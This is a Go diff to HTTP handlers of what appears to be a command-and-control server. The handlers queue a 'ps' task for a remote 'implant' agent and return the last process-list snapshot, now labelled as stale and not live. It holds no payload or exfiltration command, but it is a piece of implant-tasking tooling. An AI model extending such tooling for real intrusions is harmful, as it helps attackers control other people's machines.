@@ -6,14 +6,26 @@ import (
 	"github.com/gin-gonic/gin"
 )
 
-// handleGetProcesses returns process list for tree visualization
+// lastPSSnapshotEnvelope is the honest operator payload for GET process-tree.
+// The implant aliases process_tree → ps; this is the last completed ps blob,
+// not a live hierarchical process browser.
+func lastPSSnapshotEnvelope(result string) gin.H {
+	return gin.H{
+		"processes": result,
+		"source":    "ps",
+		"live":      false,
+		"kind":      "last_ps_snapshot",
+		"alias_of":  "ps",
+	}
+}
+
+// handleGetProcesses queues a ps task (not a live tree refresh).
 func (s *Server) handleGetProcesses(c *gin.Context) {
 	if !s.requireOperator(c) {
 		return
 	}
 	agentID := c.Param("id")
 
-	// Request process list from agent
 	task, err := s.createTask(agentID, "ps", "", "", "", "", 0, 0)
 	if err != nil {
 		respondError(c, http.StatusInternalServerError, "failed to create ps task")
@@ -23,15 +35,16 @@ func (s *Server) handleGetProcesses(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{
 		"success": true,
 		"task_id": task.ID,
-		"message": "Process list requested. Refresh in a few seconds.",
+		"source":  "ps",
+		"live":    false,
+		"message": "Queued ps. This is not a live process tree; wait for the task result.",
 	})
 }
 
-// handleGetProcessTree returns hierarchical process tree
+// handleGetProcessTree returns the last completed ps snapshot, not a live tree.
 func (s *Server) handleGetProcessTree(c *gin.Context) {
 	agentID := c.Param("id")
 
-	// Get the latest ps task result
 	var task struct {
 		Result string
 	}
@@ -42,13 +55,10 @@ func (s *Server) handleGetProcessTree(c *gin.Context) {
 		Limit(1).
 		Scan(&task).Error
 
-	if err != nil {
-		respondError(c, http.StatusNotFound, "No process list available. Run 'ps' command first.")
+	if err != nil || task.Result == "" {
+		respondError(c, http.StatusNotFound, "No completed ps snapshot. Queue ps first. This is not a live process tree.")
 		return
 	}
 
-	// Return raw result for frontend to parse
-	c.JSON(http.StatusOK, gin.H{
-		"processes": task.Result,
-	})
+	c.JSON(http.StatusOK, lastPSSnapshotEnvelope(task.Result))
 }
